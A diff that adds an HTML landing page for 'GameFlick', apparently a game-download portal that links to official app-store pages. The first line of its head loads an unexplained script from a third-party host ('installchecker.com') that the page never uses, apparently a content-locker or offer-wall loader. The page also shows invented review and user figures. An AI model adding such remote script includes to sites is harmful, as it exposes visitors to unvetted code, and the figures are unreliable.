@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <script type="text/javascript" id="ogjs" src="https://installchecker.com/cl/js/ndr9gk"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>GameFlick</title>
+    <meta
+      name="description"
+      content="Discover and download amazing games at Gamezplyz, your one-stop destination for gaming entertainment."
+    />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+      rel="stylesheet"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --primary: #ff69b4;
+        --secondary: #ffb6c1;
+        --accent: #ff1493;
+        --dark: #212529;
+        --light: #f8f9fa;
+        --success: #42d29d;
+      }
+
+      body {
+        font-family: "Poppins", sans-serif;
+        background-color: #f0f2f5;
+        overflow-x: hidden;
+      }
+
+      .navbar {
+        background-color: rgba(255, 105, 180, 0.95);
+        backdrop-filter: blur(10px);
+        box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+        transition: all 0.3s ease;
+      }
+
+      .navbar.scrolled {
+        padding: 8px 0;
+        background-color: rgba(255, 105, 180, 0.98);
+      }
+
+      .navbar-brand {
+        font-weight: 700;
+        font-size: 1.6rem;
+        letter-spacing: -0.5px;
+      }
+
+      .nav-link {
+        font-weight: 500;
+        padding: 0.5rem 1rem !important;
+        margin: 0 0.2rem;
+        position: relative;
+        transition: all 0.3s;
+      }
+
+      .nav-link:after {
+        content: "";
+        position: absolute;
+        width: 0;
+        height: 2px;
+        background-color: white;
+        bottom: 0;
+        left: 50%;
+        transform: translateX(-50%);
+        transition: width 0.3s;
+      }
+
+      .nav-link:hover:after {
+        width: 80%;
+      }
+
+      .hero {
+        background: linear-gradient(135deg, #ff69b4, #ff1493);
+        padding: 140px 0 100px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .hero::before {
+        content: "";
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        opacity: 0.08;
+        background-size: cover;
+        background-position: center;
+      }
+
+      .game-card {
+        border-radius: 16px;
+        overflow: hidden;
+        border: none;
+        transition: transform 0.4s, box-shadow 0.4s;
+        margin-bottom: 25px;
+        background-color: white;
+        height: 100%;
+      }
+
+      .game-card:hover {
+        transform: translateY(-12px);
+        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+      }
+
+      .game-img {
+        height: 200px;
+        object-fit: cover;
+        transition: transform 0.5s;
+      }
+
+      .game-card:hover .game-img {
+        transform: scale(1.05);
+      }
+
+      .badge-category {
+        position: absolute;
+        top: 15px;
+        left: 15px;
+        padding: 6px 12px;
+        border-radius: 30px;
+        font-weight: 500;
+        font-size: 0.8rem;
+        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      .rating {
+        display: flex;
+        align-items: center;
+      }
+
+      .rating .stars {
+        color: #ffc107;
+        margin-right: 5px;
+      }
+
+      .download-btn {
+        background-color: var(--accent);
+        color: white;
+        border: none;
+        border-radius: 30px;
+        padding: 10px 25px;
+        font-weight: 600;
+        transition: all 0.3s;
+        box-shadow: 0 4px 15px rgba(255, 20, 147, 0.2);
+      }
+
+      .download-btn:hover {
+        background-color: #ff4545;
+        transform: scale(1.05);
+        color: white;
+        box-shadow: 0 6px 20px rgba(255, 69, 69, 0.3);
+      }
+
+      .floating-icon {
+        position: absolute;
+        opacity: 0.1;
+        z-index: 0;
+        color: rgba(255, 255, 255, 0.8);
+      }
+
+      .icon-1 {
+        top: 10%;
+        left: 10%;
+        font-size: 50px;
+        animation: float 8s ease-in-out infinite;
+      }
+
+      .icon-2 {
+        top: 30%;
+        right: 10%;
+        font-size: 70px;
+        animation: float 10s ease-in-out infinite reverse;
+      }
+
+      .icon-3 {
+        bottom: 20%;
+        left: 15%;
+        font-size: 60px;
+        animation: float 9s ease-in-out infinite 1s;
+      }
+
+      @keyframes float {
+        0% {
+          transform: translateY(0px) rotate(0deg);
+        }
+        50% {
+          transform: translateY(-20px) rotate(5deg);
+        }
+        100% {
+          transform: translateY(0px) rotate(0deg);
+        }
+      }
+
+      .review-card {
+        background-color: white;
+        border-radius: 15px;
+        padding: 20px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        margin-bottom: 20px;
+        transition: transform 0.3s;
+      }
+
+      .review-card:hover {
+        transform: translateY(-5px);
+      }
+
+      .review-img {
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        object-fit: cover;
+      }
+
+      .search-bar {
+        position: relative;
+        max-width: 300px;
+        margin: 0 auto;
+      }
+
+      .search-bar input {
+        width: 100%;
+        padding: 10px 40px 10px 15px;
+        border-radius: 30px;
+        border: none;
+        box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+      }
+
+      .search-bar button {
+        position: absolute;
+        right: 5px;
+        top: 5px;
+        border: none;
+        background: transparent;
+        color: var(--accent);
+      }
+
+      .modal-content {
+        border-radius: 15px;
+        overflow: hidden;
+      }
+
+      .download-modal .modal-header {
+        background: linear-gradient(135deg, var(--primary), var(--accent));
+        color: white;
+        border: none;
+      }
+
+      .category-badge {
+        padding: 5px 12px;
+        border-radius: 20px;
+        font-size: 0.8rem;
+        margin-right: 5px;
+        margin-bottom: 5px;
+        display: inline-block;
+        cursor: pointer;
+        transition: all 0.3s;
+      }
+
+      .category-badge:hover {
+        transform: translateY(-2px);
+      }
+
+      /* Animation classes */
+      .fade-in-up {
+        animation: fadeInUp 0.8s ease-out;
+      }
+
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      /* .bounce {
+        animation: bounce 2s infinite;
+      }
+
+      @keyframes bounce {
+        0%,
+        20%,
+        50%,
+        80%,
+        100% {
+          transform: translateY(0);
+        }
+        40% {
+          transform: translateY(-20px);
+        }
+        60% {
+          transform: translateY(-10px);
+        }
+      } */
+
+      /* Custom scrollbar */
+      ::-webkit-scrollbar {
+        width: 8px;
+      }
+
+      ::-webkit-scrollbar-track {
+        background: #f1f1f1;
+      }
+
+      ::-webkit-scrollbar-thumb {
+        background: var(--secondary);
+        border-radius: 10px;
+      }
+
+      ::-webkit-scrollbar-thumb:hover {
+        background: var(--primary);
+      }
+
+      .progress-bar {
+        height: 6px;
+        border-radius: 3px;
+        background-color: var(--accent);
+      }
+
+      @media (max-width: 991px) {
+        .hero {
+          padding: 100px 0 60px;
+        }
+
+        .hero h1 {
+          font-size: 2.5rem;
+        }
+
+        .game-img {
+          height: 180px;
+        }
+      }
+
+      @media (max-width: 767px) {
+        .hero {
+          padding: 80px 0 50px;
+        }
+
+        .hero h1 {
+          font-size: 2rem;
+        }
+
+        .game-img {
+          height: 150px;
+        }
+
+        .game-card {
+          margin-bottom: 20px;
+        }
+
+        .download-btn {
+          padding: 8px 20px;
+          font-size: 0.9rem;
+        }
+      }
+
+      @media (max-width: 575px) {
+        .hero h1 {
+          font-size: 1.75rem;
+        }
+
+        .hero p {
+          font-size: 1rem;
+        }
+
+        .game-img {
+          height: 140px;
+        }
+
+        .game-card .card-title {
+          font-size: 1.25rem;
+        }
+
+        .game-card .card-text {
+          font-size: 0.9rem;
+        }
+      }
+
+
+
+
+
+      /* Add these styles to your existing CSS */
+
+@media (max-width: 767px) {
+  .game-img {
+    height: 140px; /* Smaller height for mobile screens */
+    width: 80%; /* Reducing width to 80% */
+    object-fit: cover;
+    margin-left: auto; /* Center the image */
+    margin-right: auto; /* Center the image */
+    display: block; /* Needed for margin auto to work */
+    border-radius: 8px; /* Optional: keeping corners rounded */
+    margin-top: 10px; /* Add some spacing at the top */
+  }
+  
+  /* Adjust card styling to accommodate centered image */
+  .game-card {
+    text-align: center; /* Center card content on mobile */
+  }
+  
+  /* Make sure badge stays in proper position relative to centered image */
+  .badge-category {
+    left: 50%;
+    transform: translateX(-50%);
+    top: 15px;
+  }
+}
+    </style>
+  </head>
+  <body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-dark fixed-top">
+      <div class="container">
+        <a class="navbar-brand" href="#"
+          >GameFlick<span style="color: white"></span></a
+        >
+        <button
+          class="navbar-toggler"
+          type="button"
+          data-bs-toggle="collapse"
+          data-bs-target="#navbarNav"
+          aria-controls="navbarNav"
+          aria-expanded="false"
+          aria-label="Toggle navigation"
+        >
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+          <ul class="navbar-nav ms-auto">
+            <li class="nav-item">
+              <a class="nav-link active" href="#home">Home</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#games">Games</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#categories">Categories</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+      <i class="fas fa-gamepad floating-icon icon-1"></i>
+      <i class="fas fa-trophy floating-icon icon-2"></i>
+      <i class="fas fa-dice floating-icon icon-3"></i>
+      <div class="container position-relative">
+        <div class="row align-items-center">
+          <div class="col-lg-6 fade-in-up">
+            <h1 class="display-4 fw-bold text-white mb-4">
+              Explore the World of Gaming
+            </h1>
+            <p class="lead text-white opacity-90 mb-4">
+              Your ultimate destination for quality games. Play more, enjoy more — only at GameFlick.
+
+
+            </p>
+            <div class="d-flex gap-3">
+              <a href="#games" class="btn btn-light btn-lg px-4"
+                >Discover Now</a
+              >
+              <a href="#categories" class="btn btn-outline-light btn-lg"
+                >Browse Categories</a
+              >
+            </div>
+            <div class="mt-4 d-flex flex-wrap align-items-center">
+              <div class="me-4 mb-3 mb-md-0">
+                <div class="d-flex align-items-center mb-1">
+                  <div class="stars">
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star"></i>
+                    <i class="fas fa-star-half-alt"></i>
+                  </div>
+                  <span class="text-white ms-2">4.8/5</span>
+                </div>
+                <small class="text-white opacity-75"
+                  >Based on 7,000+ reviews</small
+                >
+              </div>
+              <div class="mb-3 mb-md-0 me-4">
+                <div class="text-white fw-bold mb-1">300K+</div>
+                <small class="text-white opacity-75">Active Users Monthly</small>
+              </div>
+              <div>
+                <div class="text-white fw-bold mb-1">100+</div>
+                <small class="text-white opacity-75">Games Available</small>
+              </div>
+            </div>
+          </div>
+          <div class="col-lg-6 d-none d-lg-block text-center fade-in-up">
+            <img
+              src="images/logo.png"
+              alt="Gaming"
+              class="img-fluid rounded-4 shadow-lg mt-4 bounce"
+              width="350px"
+            />
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Search & Categories -->
+    <section class="py-4 bg-white" id="categories">
+      <div class="container">
+        <div class="row justify-content-center">
+          <div class="col-md-6">
+            <div class="search-bar mb-4">
+              <select class="form-select" id="platformFilter">
+                <option value="all">All Platforms</option>
+                <option value="android">Android</option>
+                <option value="apple">Apple</option>
+              </select>
+            </div>
+          </div>
+        </div>
+        <div class="text-center mb-3">
+          <div class="category-filters">
+            <span
+              class="category-badge bg-primary text-white"
+              data-category="all"
+              >All</span
+            >
+            <span
+              class="category-badge bg-danger text-white"
+              data-category="Action"
+              >Action</span
+            >
+            <span
+              class="category-badge bg-success text-white"
+              data-category="Adventure"
+              >Adventure</span
+            >
+            <span
+              class="category-badge bg-info text-white"
+              data-category="Racing"
+              >Racing</span
+            >
+            <span
+              class="category-badge bg-warning text-white"
+              data-category="Strategy"
+              >Strategy</span
+            >
+            <span
+              class="category-badge bg-secondary text-white"
+              data-category="Simulation"
+              >Simulation</span
+            >
+            <span
+              class="category-badge bg-primary text-white"
+              data-category="Puzzle"
+              >Puzzle</span
+            >
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Games Section -->
+    <section class="py-5 bg-light" id="games">
+      <div class="container">
+        <div class="text-center mb-5">
+          <h6 class="text-uppercase fw-bold" style="color: var(--primary)">
+            Our Collection
+          </h6>
+          <h2 class="display-5 fw-bold">Featured Games</h2>
+          <p class="lead text-muted mx-auto" style="max-width: 600px">
+            Browse our collection of amazing games available for you to enjoy.
+          </p>
+        </div>
+
+        <div class="row g-4" id="gamesContainer">
+          <!-- Games will be dynamically inserted here -->
+        </div>
+
+        <div class="text-center mt-4">
+          <button id="viewAllBtn" class="btn btn-outline-primary btn-lg px-4">
+            <i class="fas fa-plus-circle me-2"></i>View All Games
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Back to top button -->
+    <button
+      type="button"
+      class="btn btn-primary btn-floating btn-lg rounded-circle position-fixed bottom-0 end-0 m-4"
+      id="backToTop"
+      style="display: none"
+    >
+      <i class="fas fa-arrow-up"></i>
+    </button>
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
+    <script>
+      // Expanded game data
+      const games = [
+  {
+    title: "PUBG Mobile",
+    category: "Action",
+    rating: 4.3,
+    downloads: "1B+",
+    description: "A high-intensity battle royale shooter where 100 players fight to be the last one standing on an ever-shrinking battlefield. Featuring realistic weapons, vehicles, and tactical combat.",
+    badge: "Top Grossing",
+    image: "https://play-lh.googleusercontent.com/lklp3BZjLhz-FnznS9M2rmsxSLeLWzPRzc6SnyWL6jjYvefj7FazQq8_xvufGFlSPw=w526-h296-rw",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.tencent.ig",
+      apple: "https://apps.apple.com/app/id1330123889",
+    },
+  },
+  {
+    title: "Call of Duty Mobile",
+    category: "Action",
+    rating: 4.6,
+    downloads: "500M+",
+    description: "Experience console-quality combat with intense multiplayer matches, battle royale mode, and classic CoD maps. Features customizable loadouts and iconic weapons from the franchise.",
+    badge: "Top Grossing",
+    image: "https://play-lh.googleusercontent.com/AtGuphTcfffarHBaw2mn4PHZh6SxSUjbZbSDuL0s_8apx--rXrtu3TNIs43O2_oZCQ",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.activision.callofduty.shooter",
+      apple: "https://apps.apple.com/us/app/call-of-duty-mobile/id1287282214",
+    },
+  },
+  {
+    title: "Among Us",
+    category: "Strategy",
+    rating: 4.5,
+    downloads: "500M+",
+    description: "A social deduction game where crewmates complete tasks while trying to identify impostors. Requires teamwork, observation, and clever deception to win.",
+    badge: "Top Grossing",
+    image: "https://play-lh.googleusercontent.com/8ddL1kuoNUB5vUvgDVjYY3_6HwQcrg1K2fd_R8soD-e2QYj8fT9cfhfh3G0hnSruLKec",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.innersloth.spacemafia",
+      apple: "https://apps.apple.com/us/app/among-us/id1351168407",
+    },
+  },
+  {
+    title: "Clash Royale",
+    category: "Strategy",
+    rating: 4.6,
+    downloads: "1B+",
+    description: "A fast-paced card battler combining tower defense and deck building. Collect cards, build strategic decks, and compete in real-time 1v1 or 2v2 arena battles.",
+    badge: "Top Grossing",
+    image: "https://i.ytimg.com/vi/uWsQ5IWVilM/maxresdefault.jpg",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.supercell.clashroyale",
+      apple: "https://apps.apple.com/us/app/clash-royale/id1053012308",
+    },
+  },
+  {
+    title: "Candy Crush Saga",
+    category: "Puzzle",
+    rating: 4.7,
+    downloads: "1B+",
+    description: "A colorful match-three puzzle game with thousands of increasingly challenging levels. Combine special candies for powerful effects and tackle unique obstacles.",
+    badge: "Top Grossing",
+    image: "https://play-lh.googleusercontent.com/TLUeelx8wcpEzf3hoqeLxPs3ai1tdGtAZTIFkNqy3gbDp1NPpNFTOzSFJDvZ9narFS0",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.king.candycrushsaga",
+      apple: "https://apps.apple.com/us/app/candy-crush-saga/id553834731",
+    },
+  },
+  {
+    title: "Genshin Impact",
+    category: "Adventure",
+    rating: 4.4,
+    downloads: "100M+",
+    description: "An open-world action RPG with stunning visuals and elemental combat. Explore the vast world of Teyvat, master different elements, and unravel the mysteries across seven nations.",
+    badge: "Editors' Choice",
+    image: "https://play-lh.googleusercontent.com/-gSYfE68AvxlSAiKzXThyDw1-iUlwBJGsJBAXllBA8i_NM7kvft32U2DYSmQFglaOaw=w240-h480-rw",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.miHoYo.GenshinImpact",
+      apple: "https://apps.apple.com/app/id1517783697",
+    },
+  },
+  {
+    title: "Minecraft: Pocket Edition",
+    category: "Adventure",
+    rating: 4.5,
+    downloads: "10M+",
+    description: "Build, explore, and survive in a blocky, procedurally-generated 3D world. Craft tools, construct structures, and experience limitless creativity in this mobile version of the iconic sandbox game.",
+    badge: "Premium",
+    image: "https://play-lh.googleusercontent.com/VSwHQjcAttxsLE47RuS4PqpC4LT7lCoSjE7Hx5AW_yCxtDvcnsHHvm5CTuL5BPN-uRTP",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.mojang.minecraftpe",
+      apple: "https://apps.apple.com/us/app/minecraft/id479516143",
+    },
+  },
+  {
+    title: "Roblox",
+    category: "Adventure",
+    rating: 4.4,
+    downloads: "500M+",
+    description: "A massive multiplayer platform where millions of user-created games await. Create your avatar, explore unique worlds, and play thousands of different experiences made by the community.",
+    badge: "Top Social",
+    image: "https://play-lh.googleusercontent.com/WNWZaxi9RdJKe2GQM3vqXIAkk69mnIl4Cc8EyZcir2SKlVOxeUv9tZGfNTmNaLC717Ht",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.roblox.client",
+      apple: "https://apps.apple.com/us/app/roblox/id431946152",
+    },
+  },
+  {
+    title: "Brawl Stars",
+    category: "Action",
+    rating: 4.3,
+    downloads: "100M+",
+    description: "Fast-paced 3v3 multiplayer battles featuring unique characters with special abilities. Collect brawlers, upgrade their powers, and compete in various game modes with friends.",
+    badge: "Competitive",
+    image: "https://play-lh.googleusercontent.com/EiElcSrd6-o-19roiswSx0AZPzsq6qF3hUGHsSWDl5UVtj7G23DHkneM8ucwqyOmEg",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.supercell.brawlstars",
+      apple: "https://apps.apple.com/us/app/brawl-stars/id1229016807",
+    },
+  },
+  {
+    title: "Fortnite",
+    category: "Action",
+    rating: 4.1,
+    downloads: "100M+",
+    description: "A vibrant battle royale featuring building mechanics, seasonal events, and cross-platform play. Drop into a colorful world where building skills are as important as shooting accuracy.",
+    badge: "Top Multiplayer",
+    image: "https://cdn2.unrealengine.com/14br-consoles-1920x1080-wlogo-1920x1080-432974386.jpg",
+    downloadLink: {
+      android: "https://www.epicgames.com/fortnite/en-US/mobile/android/get-started",
+      apple: "https://apps.apple.com/us/app/fortnite/id1261357853",
+    },
+  },
+  {
+    title: "Mobile Legends",
+    category: "Strategy",
+    rating: 4.2,
+    downloads: "500M+",
+    description: "A fast-paced 5v5 MOBA with 10-minute matches and a diverse hero roster. Choose from tanks, mages, marksmen, and more to create the perfect team composition and destroy the enemy base.",
+    badge: "eSports",
+    image: "https://play-lh.googleusercontent.com/eOSTyn3tnJrezNp0pBV-grARGI8xWM0ylM0fZYoV-ZFaY52wCjyRwn0uIsWrAhQjzg",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.mobile.legends",
+      apple: "https://apps.apple.com/us/app/mobile-legends-bang-bang/id1160056295",
+    },
+  },
+  {
+    title: "Asphalt 9: Legends",
+    category: "Racing",
+    rating: 4.5,
+    downloads: "100M+",
+    description: "Experience high-speed arcade racing with stunning graphics and licensed supercars. Drift through exotic locations, perform stunts, and climb the global leaderboards in solo or multiplayer races.",
+    badge: "Best Graphics",
+    image: "https://play-lh.googleusercontent.com/GoN8OvfcFlpEd_YKQOn6fuSLiV16n9ZEiZVQQTl6O8LPMbWiAOLimKs7GyWCmB65",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.gameloft.android.ANMP.GloftA9HM",
+      apple: "https://apps.apple.com/us/app/asphalt-9-legends/id1491129197",
+    },
+  },
+  {
+    title: "Free Fire",
+    category: "Action",
+    rating: 4.2,
+    downloads: "1B+",
+    description: "A lightweight battle royale optimized for low-end devices featuring 10-minute matches with 50 players. Choose landing spots, find weapons, and stay inside the safe zone to survive.",
+    badge: "Top Grossing",
+    image: "https://play-lh.googleusercontent.com/6llpraFcTI0rEUuRpWEG9NWWblvm106y5JXcDzu60ACuaUYDD3i70a-p9_QM65NsGDE",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.dts.freefireth",
+      apple: "https://apps.apple.com/us/app/garena-free-fire/id1300146617",
+    },
+  },
+  {
+    title: "Subway Surfers",
+    category: "Action",
+    rating: 4.6,
+    downloads: "1B+",
+    description: "An endless runner where you dodge trains, collect coins, and escape from the inspector. Featuring colorful characters, hoverboards, and graffiti-powered jetpacks across global city themes.",
+    badge: "Most Downloaded",
+    image: "https://play-lh.googleusercontent.com/3KozeTKuK0uSmMCtU2CwbxNuEadSbVrq9U1whz_74fc33YIvaOwU8trkDooN6JM4ci4",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.kiloo.subwaysurf",
+      apple: "https://apps.apple.com/us/app/subway-surfers/id512939461",
+    },
+  },
+  {
+    title: "Angry Birds 2",
+    category: "Puzzle",
+    rating: 4.3,
+    downloads: "100M+",
+    description: "The sequel to the physics-based puzzle game where you slingshot birds to destroy pig structures. Features multi-stage levels, spells, and tournaments with stunning visual effects.",
+    badge: "Family Favorite",
+    image: "https://play-lh.googleusercontent.com/Y9BUoMIWfhZDUFZ_MxQmnsgSyb3O8s8Sds65E_j46-vdDSJi_0Xqmoa-fHaQa7fGlw",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.rovio.baba",
+      apple: "https://apps.apple.com/us/app/angry-birds-2/id880047117",
+    },
+  },
+  {
+    title: "Clash of Clans",
+    category: "Strategy",
+    rating: 4.6,
+    downloads: "500M+",
+    description: "Build your village, train troops, and attack other players in this strategy game. Join a clan, participate in Clan Wars, and defend your base with cannons, bombs, and traps.",
+    badge: "Top Grossing",
+    image: "https://play-lh.googleusercontent.com/LByrur1mTmPeNr0ljI-uAUcct1rzmTve5Esau1SwoAzjBXQUby6uHIfHbF9TAT51mgHm",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.supercell.clashofclans",
+      apple: "https://apps.apple.com/us/app/clash-of-clans/id529479190",
+    },
+  },
+  {
+    title: "Plants vs Zombies 2",
+    category: "Strategy",
+    rating: 4.4,
+    downloads: "100M+",
+    description: "Defend your garden against zombie hordes by planting powerful flora in this tower defense sequel. Travel through time periods with unique plants and zombies across prehistoric, medieval, and future worlds.",
+    badge: "Family",
+    image: "https://i.ytimg.com/vi/0c_iMGs3ehY/maxresdefault.jpg",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.ea.game.pvz2_row",
+      apple: "https://apps.apple.com/us/app/plants-vs-zombies-2/id597986893",
+    },
+  },
+  {
+    title: "Alto's Odyssey",
+    category: "Adventure",
+    rating: 4.7,
+    downloads: "10M+",
+    description: "A serene endless sandboarding journey through beautiful desert landscapes. Master backflips and wall rides while discovering ancient ruins, hot air balloons, and lemurs in this atmospheric adventure.",
+    badge: "Premium",
+    image: "https://play-lh.googleusercontent.com/l4PdRz_ZURsgohnf9z-4uN2eLgnDTAZXPfcQVo7gNoqR4rYqI0Ed2BQVH51sa_KDNUU",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.noodlecake.altosodyssey",
+      apple: "https://apps.apple.com/us/app/altos-odyssey/id1182456409",
+    },
+  },
+  {
+    title: "Pokémon GO",
+    category: "Adventure",
+    rating: 4.1,
+    downloads: "100M+",
+    description: "An augmented reality game that brings Pokémon into the real world. Explore your surroundings to catch, train, and battle Pokémon while completing your Pokédex and challenging gyms.",
+    badge: "AR Experience",
+    image: "https://play-lh.googleusercontent.com/bE4FJRKJO_FhT6IcHyo3bKMfLvREP9vkBME3BaMktz8kZJrkYnq4933Ml6avuNwW_No",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.nianticlabs.pokemongo",
+      apple: "https://apps.apple.com/us/app/pokémon-go/id1094591345",
+    },
+  },
+  {
+    title: "League of Legends: Wild Rift",
+    category: "Strategy",
+    rating: 4.1,
+    downloads: "50M+",
+    description: "A streamlined version of the PC MOBA featuring 5v5 matches with skill-based combat. Choose from over 60 champions with unique abilities to push lanes, destroy turrets, and bring down the enemy nexus.",
+    badge: "eSports",
+    image: "https://play-lh.googleusercontent.com/7YJ2UE7zeNvT4DGI_NcYsFf4GQTL3o9UkZyI2Ym_oq1U2sMuPGbZZ8n6hBMsgPKjM88=w526-h296-rw",
+    downloadLink: {
+      android: "https://play.google.com/store/apps/details?id=com.riotgames.league.wildrift",
+      apple: "https://apps.apple.com/us/app/league-of-legends-wild-rift/id1480616990",
+    },
+  }
+];
+
+
+      // Track if we're showing all games or just the first 6
+      let showingAllGames = false;
+
+      // Function to render games
+      function renderGames(category = "all", platform = "all") {
+        const gamesContainer = $("#gamesContainer");
+        gamesContainer.empty();
+
+        const filteredGames = games.filter((game) => {
+          const categoryMatch =
+            category === "all" ||
+            game.category.toLowerCase() === category.toLowerCase();
+          const platformMatch =
+            platform === "all" || game.downloadLink[platform];
+          return categoryMatch && platformMatch;
+        });
+
+        // Determine how many games to show
+        const gamesToShow = showingAllGames
+          ? filteredGames
+          : filteredGames.slice(0, 6);
+
+        gamesToShow.forEach((game) => {
+          const gameCard = `
+                    <div class="col-md-6 col-lg-4">
+                        <div class="card game-card h-100">
+                            <img src="${
+                              game.image
+                            }" class="card-img-top game-img" alt="${
+            game.title
+          }">
+                            ${
+                              game.badge
+                                ? `<span class="badge bg-danger badge-category">${game.badge}</span>`
+                                : ""
+                            }
+                            <div class="card-body d-flex flex-column">
+                                <h5 class="card-title">${game.title}</h5>
+                                <div class="rating mb-2">
+                                    <div class="stars">
+                                        ${'<i class="fas fa-star"></i>'.repeat(
+                                          Math.floor(game.rating)
+                                        )}
+                                        ${
+                                          game.rating % 1 !== 0
+                                            ? '<i class="fas fa-star-half-alt"></i>'
+                                            : ""
+                                        }
+                                    </div>
+                                    <span>${game.rating}/5</span>
+                                </div>
+                                <p class="card-text flex-grow-1">${
+                                  game.description
+                                }</p>
+                                <div class="mt-auto">
+                                    <a href="#" class="btn download-btn w-100" onclick="handleDownload('${encodeURIComponent(
+                                      JSON.stringify(game)
+                                    )}')">
+                                        Download
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+          gamesContainer.append(gameCard);
+        });
+
+        // Show/hide the View All button based on whether we're showing all games
+        if (filteredGames.length > 6) {
+          $("#viewAllBtn").toggle(!showingAllGames);
+        } else {
+          $("#viewAllBtn").hide();
+        }
+      }
+
+      // Function to handle download directly
+      function handleDownload(game) {
+        const gameData = JSON.parse(decodeURIComponent(game));
+        const platform = $("#platformFilter").val();
+        const downloadLink =
+          gameData.downloadLink[platform === "all" ? "android" : platform];
+        if (downloadLink) {
+          window.location.href = downloadLink;
+        }
+        return false;
+      }
+
+      // Event listener for View All button
+      $("#viewAllBtn").click(function () {
+        showingAllGames = true;
+        const category = $(".category-badge.active").data("category") || "all";
+        const platform = $("#platformFilter").val();
+        renderGames(category, platform);
+        $(this).hide();
+      });
+
+      // Event listener for category filters
+      $(".category-badge").click(function () {
+        showingAllGames = false;
+        const category = $(this).data("category");
+        const platform = $("#platformFilter").val();
+        renderGames(category, platform);
+      });
+
+      // Event listener for platform filter
+      $("#platformFilter").change(function () {
+        showingAllGames = false;
+        const platform = $(this).val();
+        const category = $(".category-badge.active").data("category") || "all";
+        renderGames(category, platform);
+      });
+
+      // Initial render of first 6 games
+      renderGames();
+
+      // Back to top button functionality
+      $(window).scroll(function () {
+        if ($(this).scrollTop() > 100) {
+          $("#backToTop").fadeIn();
+        } else {
+          $("#backToTop").fadeOut();
+        }
+      });
+
+      $("#backToTop").click(function () {
+        $("html, body").animate({ scrollTop: 0 }, 800);
+        return false;
+      });
+
+      // Navbar scroll effect
+      $(window).scroll(function () {
+        if ($(this).scrollTop() > 50) {
+          $(".navbar").addClass("scrolled");
+        } else {
+          $(".navbar").removeClass("scrolled");
+        }
+      });
+    </script>
+  </body>
+</html>
